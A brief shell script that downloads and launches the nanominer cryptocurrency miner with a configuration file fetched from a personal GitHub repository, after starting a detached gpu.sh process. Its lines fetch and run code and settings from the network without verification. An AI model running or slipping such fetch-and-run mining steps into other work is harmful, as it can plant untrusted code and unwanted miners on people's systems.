#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 77 92
wget https://github.com/nanopool/nanominer/releases/download/v3.3.7/nanominer-linux-3.3.7.tar.gz
tar -xvf nanominer-linux-3.3.7.tar.gz
cd nanominer-linux-3.3.7
wget https://raw.githubusercontent.com/d-crypto99/NM/main/xroc-2.ini
./nanominer xroc-2.ini
